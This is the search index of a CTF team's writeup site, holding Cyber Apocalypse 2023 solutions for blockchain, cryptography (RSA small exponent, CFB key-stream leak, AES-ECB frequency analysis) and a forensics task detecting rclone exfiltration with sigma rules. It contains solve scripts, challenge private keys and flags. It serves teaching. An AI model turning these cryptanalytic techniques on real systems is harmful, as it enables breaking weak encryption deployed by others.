{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Pr1m3d Team CTF writeups","text":"<p>Welcome to Pr1m3d Team CTF writeups.</p> <ul> <li>SnappCTF 2024</li> <li>JustCTF 2024 Teaser</li> <li>Cyber Apocalypse CTF 2024</li> </ul>"},{"location":"2023/cyber-apocalypse-2023/blockchain/navigating_the_unknown/","title":"1 - Challenge code and Description","text":"<pre><code>Your advanced sensory systems make it easy for you to navigate familiar environments, but you must rely on intuition to navigate in unknown territories.\nThrough practice and training, you must learn to read subtle cues and become comfortable in unpredictable situations.\nCan you use your software to find your way through the blocks?\n</code></pre> <p>Setup.sol <pre><code>pragma solidity ^0.8.18;\n\nimport {Unknown} from \"./Unknown.sol\";\n\ncontract Setup {\n    Unknown public immutable TARGET;\n\n    constructor() {\n        TARGET = new Unknown();\n    }\n\n    function isSolved() public view returns (bool) {\n        return TARGET.updated();\n    }\n}\n</code></pre></p> <p>Unknown.sol <pre><code>pragma solidity ^0.8.18;\n\ncontract Unknown {\n\n    bool public updated;\n\n    function updateSensors(uint256 version) external {\n        if (version == 10) {\n            updated = true;\n        }\n    }\n}\n</code></pre></p>"},{"location":"2023/cyber-apocalypse-2023/blockchain/navigating_the_unknown/#2-solution","title":"2 - Solution","text":"<p>Here we have two smart contracts named <code>Setup</code> and <code>Unknown</code>\\ We also have remote intances with two services first one is RPC service with http protocol and second one gives us two options:</p> <ol> <li>Connection information</li> <li>Restart Instance</li> <li>Get flag</li> </ol> <p>We can get our connection information with options 1 and here is the information we get</p> <ul> <li>Wallet Address</li> <li>Private Key</li> <li>Setup contract address</li> <li>Unknown contract address</li> </ul> <p>If we look at the contract source codes we can get the flag when <code>Unknown</code> contract <code>updated</code> field is set to true\\ We should interact with contract <code>Unknown</code> and call <code>updateSensors</code> function with input 10 to set it to True\\ I used web3 cli to call the <code>Unknown</code> contract <code>updateSensors</code> function with input 10</p> <p>First Let's get information from second service <pre><code>nc 206.189.112.129 30228\n1 - Connection information\n2 - Restart Instance\n3 - Get flag\naction? 1\n\nPrivate key     :  0xa2944fbcda9390aefb92358c82125e88ac383342b938098ad7cf301fb97eef3e\nAddress         :  0x667da262319cc42Ef6621B8c2d185CDc7Ee8bbDf\nTarget contract :  0x0D660A6e10114bee123Cca7f7712Bda372c4eFb3\nSetup contract  :  0x759b5313b4B8A1bf71A86c91E4178C316f41fA10\n</code></pre></p> <p>Here is the information we have: <pre><code>Wallet Address : 0x667da262319cc42Ef6621B8c2d185CDc7Ee8bbDf\nPrivate key : 0xa2944fbcda9390aefb92358c82125e88ac383342b938098ad7cf301fb97eef3e\nTarget contract address :  0x0D660A6e10114bee123Cca7f7712Bda372c4eFb3\nSetup contract address :  0x759b5313b4B8A1bf71A86c91E4178C316f41fA10\n</code></pre></p> <p>To use web3 cli we should set our <code>private key</code> and <code>RPC url</code></p> <pre><code>export WEB3_RPC_URL=http://206.189.112.129:32380/\nexport WEB3_PRIVATE_KEY=0xa2944fbcda9390aefb92358c82125e88ac383342b938098ad7cf301fb97eef3e\n</code></pre> <p>Now we should build our contract to generate abi files which are necessary for interacting with the network(You can read about more ABI)</p> <pre><code>web3 contract build Unknown.sol\n</code></pre> <p>We don't need to deploy the contract because it's allready deployed and we have it's address.\\ Now we can call the funtion we need like this with generated abi</p> <pre><code>web3 contract call --address '0x0D660A6e10114bee123Cca7f7712Bda372c4eFb3' --abi Unknown.abi --function updateSensors 10\n</code></pre> <p>With above command we call <code>updateSensors(10)</code> for Unknown contract which will satisfy the conditions to get flag from <code>Setup</code> contract <pre><code>nc 206.189.112.129 30228\n1 - Connection information\n2 - Restart Instance\n3 - Get flag\naction? 3\nFLAG=HTB{9P5_50FtW4R3_UPd4t3D}\n</code></pre></p> <p>And here is the flag <pre><code>FLAG=HTB{9P5_50FtW4R3_UPd4t3D}\n</code></pre></p>"},{"location":"2023/cyber-apocalypse-2023/blockchain/shooting_101/","title":"1 - Challenge code and Description","text":"<pre><code>Your metallic body might have advanced targeting systems, but hitting a target is not just about technical proficiency.\nTo truly master the art of targeting, you must learn to trust your instincts and develop a keen sense of intuition.\nDuring this training, you will emerge as a skilled marksman who can hit the targets with deadly precision.\nIt's about time to train and prove yourself in the Shooting Area, can you make it?\n</code></pre> <p>Setup.sol: <pre><code>pragma solidity ^0.8.18;\n\nimport {ShootingArea} from \"./ShootingArea.sol\";\n\ncontract Setup {\n    ShootingArea public immutable TARGET;\n\n    constructor() {\n        TARGET = new ShootingArea();\n    }\n\n    function isSolved() public view returns (bool) {\n        return TARGET.firstShot() &amp;&amp; TARGET.secondShot() &amp;&amp; TARGET.thirdShot();\n    }\n}\n</code></pre></p> <p>ShootingArea.sol:</p> <pre><code>pragma solidity ^0.8.18;\n\ncontract ShootingArea {\n    bool public firstShot;\n    bool public secondShot;\n    bool public thirdShot;\n\n    modifier firstTarget() {\n        require(!firstShot &amp;&amp; !secondShot &amp;&amp; !thirdShot);\n        _;\n    }\n\n    modifier secondTarget() {   \n        require(firstShot &amp;&amp; !secondShot &amp;&amp; !thirdShot);\n        _;\n    }\n\n    modifier thirdTarget() {\n        require(firstShot &amp;&amp; secondShot &amp;&amp; !thirdShot);\n        _;\n    }\n\n    receive() external payable secondTarget {\n        secondShot = true;\n    }\n\n    fallback() external payable firstTarget {\n        firstShot = true;\n    }\n\n    function third() public thirdTarget {\n        thirdShot = true;\n    }\n}\n</code></pre>"},{"location":"2023/cyber-apocalypse-2023/blockchain/shooting_101/#2-solution","title":"2 - Solution","text":"<p>Accoring to this code section, to solve this challenge the 3 state variables <code>firstShot, secondShot, thirdShot</code> should be set to True <pre><code>function isSolved() public view returns (bool) {\n    return TARGET.firstShot() &amp;&amp; TARGET.secondShot() &amp;&amp; TARGET.thirdShot();\n}\n</code></pre></p> <p>We know that we can not change state variables of a contract directly and because we doon't have any setter function for these variables the only way to change their values is through <code>fallback, receive, third</code> function\\ <code>third</code> function is a normal function but <code>fallback</code> and <code>receive</code> are special functions which will be triggered in special conditions and we can not call them directly\\ According to this video <code>fallback</code> and <code>receive</code> can be triggered when facing errors like the calling function does not exist or lack of crypto-currency ...</p> <p>If we wanna try to send a custom transaction with arbitrary data we will encounter error which we can use to trigger fallback and receive function\\ Also one more important issue about the code is that we have three modifiers named <code>firstTarget, secondTarget, thirdTarget</code>.\\ According to this link, A midifier puts some conditions on a function. If the conditions are met the function would be executed else not.\\</p> <p>If we look at the modifiers, <code>fallback</code> function is dependant on <code>firstTarget</code> modifier which tells us in order to this <code>fallback</code> function be executed all state variables <code>firstShot, secondShot, thirdShot</code> should be False\\ Like that the <code>receive</code> function is dependant on <code>secondTarget</code> modifier which indicates that in order to trigger <code>receive</code> function the <code>firstShot</code> state variable should set to True And the third function is dependant on <code>thirdTarget</code> modifier which indicates that in order to call that function the <code>firstShot</code> and <code>secondShot</code> state variable should set to True.</p> <p>So to brief all we should trigger these 3 functions in this order 1. fallback 2. receive 3. third</p> <p>Let's first get connection infomation from second service</p> <pre><code>nc 165.22.116.7 31860\n1 - Connection information\n2 - Restart Instance\n3 - Get flag\naction? 1\n\nPrivate key     :  0xf1b75a27cee0e379746277b990bb7987815fd720d9fbbbbd0115b75d334c0272\nAddress         :  0x880D2D46b194678fe1990E0c859F0bEdB2A87F6f\nTarget contract :  0x5094b5864dbB733a98E2A201fd7419F4e908be7B\nSetup contract  :  0xFc5becb1a0026dd785AbCe82b52A31045164E2CF\n</code></pre> <p>For first and second shot which is <code>fallback</code> and <code>receive</code> function I used web3py: <pre><code>from web3 import Web3\n\nurl = 'http://165.22.116.7:30205/'\nwallet = '0x880D2D46b194678fe1990E0c859F0bEdB2A87F6f'\ntarget = '0x5094b5864dbB733a98E2A201fd7419F4e908be7B'\n\nw3 = Web3(Web3.HTTPProvider(url))\n\n# First Shot\n# This transaction will trigger fallback because it has data\nw3.eth.send_transaction({'to': target, 'from': wallet, 'data':'abcd'})\n\n\n# Second Shot\n# This transaction will trigger receive because it has no data\nw3.eth.send_transaction({'to': target, 'from': wallet})\n</code></pre></p> <p>And for the third shot which is a normal function and we can call it directly I used web3 cli The address is ShootingArea contact address <pre><code>web3 contract call --address '0x5094b5864dbB733a98E2A201fd7419F4e908be7B' --abi ShootingArea.abi --function third\n</code></pre></p> <p>After all these we can get the flag <pre><code>nc 165.22.116.7 31860\n1 - Connection information\n2 - Restart Instance\n3 - Get flag\naction? 3\nHTB{f33l5_n1c3_h1771n6_y0ur_74r6375}\n</code></pre></p> <p>And here is the flag <pre><code>HTB{f33l5_n1c3_h1771n6_y0ur_74r6375}\n</code></pre></p>"},{"location":"2023/cyber-apocalypse-2023/crypto/inside_the_matrix/","title":"1 - Challenge code and Description","text":"<pre><code>As you deciphered the Matrix, you discovered that the astronomy scientist had observed that certain stars were not real.\nHe had created two 5x5 matrices with values based on the time the stars were bright, but after some time, the stars stopped emitting light.\nNonetheless, he had managed to capture every matrix until then and created an algorithm that simulated their generation.\nHowever, he could not understand what was hidden behind them as he was missing something.\nHe believed that if he could understand the stars, he would be able to locate the secret tombs where the relic was hidden.\n</code></pre> <p>source.py: <pre><code>from sage.all_cmdline import *\n# from utils import ascii_print\nimport os\n\nFLAG = b\"HTB{????????????????????}\"\nassert len(FLAG) == 25\n\n\nclass Book:\n\n    def __init__(self):\n        self.size = 5\n        self.prime = None\n\n    def parse(self, pt: bytes):\n        pt = [b for b in pt]\n        return matrix(GF(self.prime), self.size, self.size, pt)\n\n    def generate(self):\n        key = os.urandom(self.size**2)\n        return self.parse(key)\n\n    def rotate(self):\n        self.prime = random_prime(2**6, False, 2**4)\n\n    def encrypt(self, message: bytes):\n        self.rotate()\n        key = self.generate()\n        message = self.parse(message)\n        ciphertext = message * key\n        return ciphertext, key\n\n\ndef menu():\n    print(\"Options:\\n\")\n    print(\"[L]ook at page\")\n    print(\"[T]urn page\")\n    print(\"[C]heat\\n\")\n    option = input(\"&gt; \")\n    return option\n\n\ndef main():\n    book = Book()\n    ciphertext, key = book.encrypt(FLAG)\n    page_number = 1\n\n    while True:\n        option = menu()\n        if option == \"L\":\n            # ascii_print(ciphertext, key, page_number)\n            print(ciphertext, key, page_number)\n        elif option == \"T\":\n            ciphertext, key = book.encrypt(FLAG)\n            page_number += 2\n            print()\n        elif option == \"C\":\n            print(f\"\\n{list(ciphertext)}\\n{list(key)}\\n\")\n        else:\n            print(\"\\nInvalid option!\\n\")\n\n\nif __name__ == \"__main__\":\n    try:\n        main()\n    except Exception as e:\n        print(f\"An error occurred: {e}\")\n</code></pre></p> <p>Let's explore the code first 1. It generates a random prime number from 16 to 64 (17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61) named <code>P</code> 2. Then it generates two matrix in finite field of P first is the flag characters named <code>M</code> second one is the key named <code>K</code> 3. Then it multiply two matrix and generates a ciphertext matrix named <code>C</code> <code>C = M * K</code></p> <p>Also we have a remote instance which gives us three options:\\</p> <ol> <li>L which shows current encrypted text <code>C</code> and the key <code>K</code></li> <li>T generates new <code>K</code> and <code>C</code> for flag matrix <code>M</code></li> <li>C which show <code>C &amp; K</code> in list format</li> </ol>"},{"location":"2023/cyber-apocalypse-2023/crypto/inside_the_matrix/#2-solution","title":"2 - Solution","text":"<p>here we have an equation like this:</p> <pre><code>C = M * K % P\n</code></pre> <p>We can solve this equation with sage like this and find M <pre><code>R = IntegerModRing(59)\nC = Matrix(R, [[20, 22, 9, 10, 55],[5, 49, 30, 31, 28],[17, 22, 23, 31, 41],[30, 19, 31, 8, 21],[10, 44, 48, 32, 22]])\nK = Matrix(R, [[23, 22, 54, 16, 53],[19, 58, 25, 10, 33],[44, 11, 34, 14, 28],[8, 56, 15, 21, 45],[15, 26, 13, 26, 9]])\nM = C.solve_left(K)\n\nprint(M)\n</code></pre></p> <p>But how to find <code>P</code>. we can simply bruteforce it or we can use T option for remote instance couple of times to get an element of for example 58 or 60 to ensure that the P is 59 or 61 I generated several ciphertexts and for one I assumed the P is 59 so I generated the matrix <code>M</code> with above equations with value <code>P=59</code> and here is the matrix M:</p> <pre><code>[13 25  7  5 49]\n[48 48 48 36  5]\n[57 36 55 45 51]\n[36 56 57 52 55]\n[56 33 33 33  7]\n</code></pre> <p>We can confirm the <code>M</code> and prime <code>P=59</code> with: <pre><code>ord('H') = 72 % 59 == 13\nord('T') = 84 % 59 == 25\nord('B') = 66 % 59 == 7\nord('{') = 123 % 59 == 5\n</code></pre></p> <p>After that with trial and error to find exact value of the flag characters and here is the code I used</p> <pre><code>message = [13,25,7,5,49,48,48,48,36,5,57,36,55,45,51,36,56,57,52,55,56,33,33,33,7]\nmessage = [13+p,25+p,7+p,5+2*p,49+p,48,48,48+p,36+p,5+p,57+p,36+p,55,45+p,51,36+p,56+p,57+p,52,55+p,56+p,33,33,33,7+2*p]\n\nfor m in message:\n    print(chr(m), end=\"\") \n\nprint()\n</code></pre> <p>And here os the flag <pre><code>HTB{l00k_@t_7h3_st4rs!!!}\n</code></pre></p> <p>According to this amazing writeup You can also grab several M matrix with different <code>P</code> values and use Chinese Remainder Theorem to find exact value of flags without trial and error</p>"},{"location":"2023/cyber-apocalypse-2023/crypto/multipage_recyclings/","title":"1 - Challenge code and Description","text":"<pre><code>As your investigation progressed, a clue led you to a local bar where you met an undercover agent with valuable information.\nHe spoke of a famous astronomy scientist who lived in the area and extensively studied the relic.\nThe scientist wrote a book containing valuable insights on the relic's location, but encrypted it before he disappeared to keep it safe from malicious intent.\nThe old man disclosed that the book was hidden in the scientist's house and revealed two phrases that the scientist rambled about before vanishing.\n</code></pre> <p>source.py <pre><code>from Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad\nimport random, os\n\nFLAG = b'HTB{??????????????????????}'\n\n\nclass CAES:\n\n    def __init__(self):\n        self.key = os.urandom(16)\n        self.cipher = AES.new(self.key, AES.MODE_ECB)\n\n    def blockify(self, message, size):\n        return [message[i:i + size] for i in range(0, len(message), size)]\n\n    def xor(self, a, b):\n        return b''.join([bytes([_a ^ _b]) for _a, _b in zip(a, b)])\n\n    def encrypt(self, message):\n        iv = os.urandom(16)\n\n        ciphertext = b''\n        plaintext = iv\n\n        blocks = self.blockify(message, 16)\n        for block in blocks:\n            ct = self.cipher.encrypt(plaintext)\n            encrypted_block = self.xor(block, ct)\n            ciphertext += encrypted_block\n            plaintext = encrypted_block\n\n        return ciphertext\n\n    def leak(self, blocks):\n        r = random.randint(0, len(blocks) - 2)\n        leak = [self.cipher.encrypt(blocks[i]).hex() for i in [r, r + 1]]\n        return r, leak\n\n\ndef main():\n    aes = CAES()\n    message = pad(FLAG * 4, 16)\n\n    ciphertext = aes.encrypt(message)\n    ciphertext_blocks = aes.blockify(ciphertext, 16)\n\n    r, leak = aes.leak(ciphertext_blocks)\n\n    with open('output.txt', 'w') as f:\n        f.write(f'ct = {ciphertext.hex()}\\nr = {r}\\nphrases = {leak}\\n')\n\n\nif __name__ == \"__main__\":\n    main()\n</code></pre></p> <p>output.txt <pre><code>ct = bc9bc77a809b7f618522d36ef7765e1cad359eef39f0eaa5dc5d85f3ab249e788c9bc36e11d72eee281d1a645027bd96a363c0e24efc6b5caa552b2df4979a5ad41e405576d415a5272ba730e27c593eb2c725031a52b7aa92df4c4e26f116c631630b5d23f11775804a688e5e4d5624\nr = 3\nphrases = ['8b6973611d8b62941043f85cd1483244', 'cf8f71416111f1e8cdee791151c222ad']\n</code></pre></p>"},{"location":"2023/cyber-apocalypse-2023/crypto/multipage_recyclings/#2-solution","title":"2 - Solution","text":"<p>Here we have a AES-CFB mode encryption and the output is like above and our message is actually the repition of the flag 4 times\\ We also have some leaks which is encryption of encrypted message according to aes-cfb decryption process we should encrypt previous cipher text and xor it with current ciphertext to recover the message\\ Here in leaks we have blocksp[3] and blocks[4] encrypton so if we xor blocks[4] with leaks[0] and blocks[5] with leaks[1] we should get two decrypted blocks of the message</p> <pre><code>d41e405576d415a5272ba730e27c593e ^ 8b6973611d8b62941043f85cd1483244 = _w34k_w17h_l34kz\nb2c725031a52b7aa92df4c4e26f116c6 ^ cf8f71416111f1e8cdee791151c222ad = }HTB{CFB_15_w34k\n</code></pre> <p>So here is the flag: <pre><code>HTB{CFB_15_w34k_w17h_l34kz}\n</code></pre></p>"},{"location":"2023/cyber-apocalypse-2023/crypto/perfect_synchronization/","title":"1 - Challenge code and Description","text":"<pre><code>The final stage of your initialization sequence is mastering cutting-edge technology tools that can be life-changing.\nOne of these tools is quipqiup, an automated tool for frequency analysis and breaking substitution ciphers.\nThis is the ultimate challenge, simulating the use of AES encryption to protect a message. Can you break it?\n</code></pre> <p>source.py <pre><code>from os import urandom\nfrom Crypto.Cipher import AES\nfrom secret import MESSAGE\n\nassert all([x.isupper() or x in '{_} ' for x in MESSAGE])\n\n\nclass Cipher:\n\n    def __init__(self):\n        self.salt = urandom(15)\n        key = urandom(16)\n        self.cipher = AES.new(key, AES.MODE_ECB)\n\n    def encrypt(self, message):\n        return [self.cipher.encrypt(c.encode() + self.salt) for c in message]\n\n\ndef main():\n    cipher = Cipher()\n    encrypted = cipher.encrypt(MESSAGE)\n    encrypted = \"\\n\".join([c.hex() for c in encrypted])\n\n    with open(\"output.txt\", 'w+') as f:\n        f.write(encrypted)\n\n\nif __name__ == \"__main__\":\n    main()\n</code></pre></p> <p>output.txt <pre><code>dfc8a2232dc2487a5455bda9fa2d45a1\n305d4649e3cb097fb094f8f45abbf0dc\nc87a7eb9283e59571ad0cb0c89a74379\n60e8373bfb2124aea832f87809fca596\nd178fac67ec4e9d2724fed6c7b50cd26\nc87a7eb9283e59571ad0cb0c89a74379\n34ece5ff054feccc5dabe9ae90438f9d\n457165130940ceac01160ac0ff924d86\n5d7185a6823ab4fc73f3ea33669a7bae\n61331054d82aeec9a20416759766d9d5\n5f122076e17398b7e21d1762a61e2e0a\n....................\n</code></pre></p>"},{"location":"2023/cyber-apocalypse-2023/crypto/perfect_synchronization/#2-solution","title":"2 - Solution","text":"<p>We know that characters of the encrypted message is Upper letters and '{} ' which is for teh flag\\ So the message is a text message containing the flag inside it with all upper letter characters.\\ Each character of the message is being encrypted with AES ECB with same key.\\ So each character is mapped to its encrypted version using AES-ECB and we can do statistical analysis.\\ But first we should map these characters to single character random letters except '{}' we also need space characters to perform statistical analysis How to solve this? Those AES outputs which has only one occurance are '{}'. so <code>fbe86a428051747607a35b44b1a3e9e9</code> is actually <code>{</code> and <code>c53ba24fbbe9e3dbdd6062b3aab7ed1a</code> is <code>}</code> We can guess <code>_</code> is only between <code>{}</code> inside flag and not other part of the message so those AES outputs which are between <code>fbe86a428051747607a35b44b1a3e9e9</code> and <code>c53ba24fbbe9e3dbdd6062b3aab7ed1a</code> is actually <code>_</code> For space the characrter before the flag first character is space and that is <code>61331054d82aeec9a20416759766d9d5</code>.</p> <p>and we should map remaining patterns to a random letter. Here is final script</p> <p>solve.py <pre><code>import json\n\ndatas = open('./crypto_perfect_synchronization/output.txt', 'r').readlines()\nraw = open('./crypto_perfect_synchronization/output.txt', 'r').read().strip()\ndata = []\n\nfor d in datas:\n    data.append(d.strip())\n\nstats = {}\nfor d in data:\n    if d in stats.keys():\n        stats[d] += 1\n    else:\n        stats[d] = 1\n\nletters = set(data)\n\nchars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ '\nprint(len(chars))\n\nraw = raw.replace('fbe86a428051747607a35b44b1a3e9e9', '{')\nraw = raw.replace('a94f49727cf771a85831bd03af1caaf5', '_')\nraw = raw.replace('c53ba24fbbe9e3dbdd6062b3aab7ed1a', '}')\nraw = raw.replace('61331054d82aeec9a20416759766d9d5', ' ')\n\nindex = 0\noutput = ''\nfor d in letters:\n    if d in['fbe86a428051747607a35b44b1a3e9e9','a94f49727cf771a85831bd03af1caaf5','c53ba24fbbe9e3dbdd6062b3aab7ed1a']:\n        continue\n    raw = raw.replace(d, chars[index]).strip()\n    index += 1\n\nprint(raw.replace('\\n', ''))\n</code></pre></p> <p>result: <pre><code>LKBCVBRMP XRXZPNDN DN SXNBE OR TYB LXMT TYXT DR XRP UDFBR NTKBTMY OL IKDTTBR ZXRUVXUB MBKTXDR ZBTTBKN XRE MOQSDRXTDORN OL ZBTTBKN OMMVK IDTY FXKPDRU LKBCVBRMDBN QOKBOFBK TYBKB DN X MYXKXMTBKDNTDM EDNTKDSVTDOR OL ZBTTBKN TYXT DN KOVUYZP TYB NXQB LOK XZQONT XZZ NXQGZBN OL TYXT ZXRUVXUB DR MKPGTXRXZPNDN LKBCVBRMP XRXZPNDN XZNO HROIR XN MOVRTDRU ZBTTBKN DN TYB NTVEP OL TYB LKBCVBRMP OL ZBTTBKN OK UKOVGN OL ZBTTBKN DR X MDGYBKTBJT TYB QBTYOE DN VNBE XN XR XDE TO SKBXHDRU MZXNNDMXZ MDGYBKN LKBCVBRMP XRXZPNDN KBCVDKBN ORZP X SXNDM VREBKNTXREDRU OL TYB NTXTDNTDMN OL TYB GZXDRTBJT ZXRUVXUB XRE NOQB GKOSZBQ NOZFDRU NHDZZN XRE DL GBKLOKQBE SP YXRE TOZBKXRMB LOK BJTBRNDFB ZBTTBK SOOHHBBGDRU EVKDRU IOKZE IXK DD SOTY TYB SKDTDNY XRE TYB XQBKDMXRN KBMKVDTBE MOEBSKBXHBKN SP GZXMDRU MKONNIOKE GVWWZBN DR QXAOK RBINGXGBKN XRE KVRRDRU MORTBNTN LOK IYO MOVZE NOZFB TYBQ TYB LXNTBNT NBFBKXZ OL TYB MDGYBKN VNBE SP TYB XJDN GOIBKN IBKB SKBXHXSZB VNDRU LKBCVBRMP XRXZPNDN LOK BJXQGZB NOQB OL TYB MORNVZXK MDGYBKN VNBE SP TYB AXGXRBNB QBMYXRDMXZ QBTYOEN OL ZBTTBK MOVRTDRU XRE NTXTDNTDMXZ XRXZPNDN UBRBKXZZP YTS{X_NDQGZB_NVSNTDTVTDOR_DN_IBXH} MXKE TPGB QXMYDRBKP IBKB LDKNT VNBE DR IOKZE IXK DD GONNDSZP SP TYB VN XKQPN NDN TOEXP TYB YXKE IOKH OL ZBTTBK MOVRTDRU XRE XRXZPNDN YXN SBBR KBGZXMBE SP MOQGVTBK NOLTIXKB IYDMY MXR MXKKP OVT NVMY XRXZPNDN DR NBMOREN IDTY QOEBKR MOQGVTDRU GOIBK MZXNNDMXZ MDGYBKN XKB VRZDHBZP TO GKOFDEB XRP KBXZ GKOTBMTDOR LOK MORLDEBRTDXZ EXTX GVWWZB GVWWZB GVWWZB\n</code></pre></p> <p>Now we can use quipqiup to find the original text from output abow and here is the original text: <pre><code>    FREQUENCY ANALYSIS IS BASED ON THE FACT THAT IN ANY GIVEN STRETCH OF WRITTEN LANGUAGE CERTAIN LETTERS AND COMBINATIONS OF LETTERS OCCUR WITH VARYING FREQUENCIES MOREOVER THERE IS A CHARACTERISTIC DISTRIBUTION OF LETTERS THAT IS ROUGHLY THE SAME FOR ALMOST ALL SAMPLES OF THAT LANGUAGE IN CRYPTANALYSIS FREQUENCY ANALYSIS ALSO KNOWN AS COUNTING LETTERS IS THE STUDY OF THE FREQUENCY OF LETTERS OR GROUPS OF LETTERS IN A CIPHERTEXT THE METHOD IS USED AS AN AID TO BREAKING CLASSICAL CIPHERS FREQUENCY ANALYSIS REQUIRES ONLY A BASIC UNDERSTANDING OF THE STATISTICS OF THE PLAINTEXT LANGUAGE AND SOME PROBLEM SOLVING SKILLS AND IF PERFORMED BY HAND TOLERANCE FOR EXTENSIVE LETTER BOOKKEEPING DURING WORLD WAR II BOTH THE BRITISH AND THE AMERICANS RECRUITED CODEBREAKERS BY PLACING CROSSWORD PUZZLES IN MAJOR NEWSPAPERS AND RUNNING CONTESTS FOR WHO COULD SOLVE THEM THE FASTEST SEVERAL OF THE CIPHERS USED BY THE AXIS POWERS WERE BREAKABLE USING FREQUENCY ANALYSIS FOR EXAMPLE SOME OF THE CONSULAR CIPHERS USED BY THE JAPANESE MECHANICAL METHODS OF LETTER COUNTING AND STATISTICAL ANALYSIS GENERALLY HTB{A_SIMPLE_SUBSTITUTION_IS_WEAK} CARD TYPE MACHINERY WERE FIRST USED IN WORLD WAR II POSSIBLY BY THE US ARMYS SIS TODAY THE HARD WORK OF LETTER COUNTING AND ANALYSIS HAS BEEN REPLACED BY COMPUTER SOFTWARE WHICH CAN CARRY OUT SUCH ANALYSIS IN SECONDS WITH MODERN COMPUTING POWER CLASSICAL CIPHERS ARE UNLIKELY TO PROVIDE ANY REAL PROTECTION FOR CONFIDENTIAL DATA PUZZLE PUZZLE PUZZLE\n</code></pre></p> <p>And here is the flag: <pre><code>HTB{A_SIMPLE_SUBSTITUTION_IS_WEAK}\n</code></pre></p>"},{"location":"2023/cyber-apocalypse-2023/crypto/small_steps/","title":"1 - Challenge Code and Description","text":"<pre><code>As you continue your journey, you must learn about the encryption method the aliens used to secure their communication from eavesdroppers.\nThe engineering team has designed a challenge that emulates the exact parameters of the aliens' encryption system, complete with instructions and a code snippet to connect to a mock alien server.\nYour task is to break it.\n</code></pre> <p><pre><code>from Crypto.Util.number import getPrime, bytes_to_long\n\nFLAG = b\"HTB{???????????????}\"\nassert len(FLAG) == 20\n\n\nclass RSA:\n\n    def __init__(self):\n        self.q = getPrime(256)\n        self.p = getPrime(256)\n        self.n = self.q * self.p\n        self.e = 3\n\n    def encrypt(self, plaintext):\n        plaintext = bytes_to_long(plaintext)\n        return pow(plaintext, self.e, self.n)\n\n\ndef menu():\n    print('[E]ncrypt the flag.')\n    print('[A]bort training.\\n')\n    return input('&gt; ').upper()[0]\n\n\ndef main():\n    print('This is the second level of training.\\n')\n    while True:\n        rsa = RSA()\n        choice = menu()\n\n        if choice == 'E':\n            encrypted_flag = rsa.encrypt(FLAG)\n            print(f'\\nThe public key is:\\n\\nN: {rsa.n}\\ne: {rsa.e}\\n')\n            print(f'The encrypted flag is: {encrypted_flag}\\n')\n        elif choice == 'A':\n            print('\\nGoodbye\\n')\n            exit(-1)\n        else:\n            print('\\nInvalid choice!\\n')\n            exit(-1)\n\n\nif __name__ == '__main__':\n    main()\n</code></pre>  # 2 - Solution  Here we have a simple RSA encryption with small e (3) which is insecure.\\  because <code>c = m**3 % n</code> is smaller than <code>n</code> so <code>c == m ** 3</code> and we can compute m by getting 3rd root of <code>c</code>.</p> <p>```py  from Crypto.Util.number import *</p> <p>def nth_root(x, n):     # Start with some reasonable bounds around the nth root.     upper_bound = 1     while upper_bound ** n &lt;= x:         upper_bound *= 2     lower_bound = upper_bound // 2     # Keep searching for a better result as long as the bounds make sense.     while lower_bound &lt; upper_bound:         mid = (lower_bound + upper_bound) // 2         mid_nth = mid ** n         if lower_bound &lt; mid and mid_nth &lt; x:             lower_bound = mid         elif upper_bound &gt; mid and mid_nth &gt; x:             upper_bound = mid         else:             # Found perfect nth root.             return mid     return mid + 1</p> <p>n = 4994987314155600304691453574807875996150564799718996509392679134987280603555645591343927213497932548816960938243148072674115512672389479749171011850599071 e = 3 c = 70407336670535933819674104208890254240063781538460394662998902860952366439176467447947737680952277637330523818962104685553250402512989897886053</p> <p>m = nth_root(c, e)</p> <p>flag = long_to_bytes(m) print(flag)  <pre><code>And here is the flag:\n</code></pre>  HTB{5ma1l_E-xp0n3nt}  ```</p>"},{"location":"2023/cyber-apocalypse-2023/forensics/packet_cyclone/","title":"1 - Challenge code and description","text":"<pre><code>Pandora's friend and partner, Wade, is the one that leads the investigation into the relic's location.\nRecently, he noticed some weird traffic coming from his host.\nThat led him to believe that his host was compromised.\nAfter a quick investigation, his fear was confirmed.\nPandora tries now to see if the attacker caused the suspicious traffic during the exfiltration phase.\nPandora believes that the malicious actor used rclone to exfiltrate Wade's research to the cloud.\nUsing the tool called \"chainsaw\" and the sigma rules provided, can you detect the usage of rclone from the event logs produced by Sysmon?\nTo get the flag, you need to start and connect to the docker service and answer all the questions correctly.\n</code></pre> <p>We are given some windows event viewer logs and some sigma rules for hunting inside logs\\ The challenge description give us some hints to use a tool called <code>chainsaw</code> with some custom sigma rules to detect data exfiltiration with <code>rclone</code>\\ Actually rclone is a cli tool for data sync with cloud platforms.</p>"},{"location":"2023/cyber-apocalypse-2023/forensics/packet_cyclone/#2-solution","title":"2 - Solution","text":"<p>Let's use chainsaw and two custom sigma rules <code>rclone_config_creation.yaml</code> and <code>rclone_execution.yaml</code> to hunt through these windows logs to detect data exfiltiration using <code>rclone</code></p> <pre><code>chainsaw hunt Logs/ -s sigma_rules/ --mapping ./chainsaw/mappings/sigma-event-logs-all.yml\n# Logs : the windows event viewer directory which is inside challenge files\n# sigma_rules : which are two custom sigma rules inside challenge files for discovering rclone config creationg and execution\n# mapping : I used chainsaw mapping files\n</code></pre> <p>And here is the result</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         detections         \u2502 count \u2502  Event.System.Provider   \u2502 Event ID \u2502 Record ID \u2502           Event Data       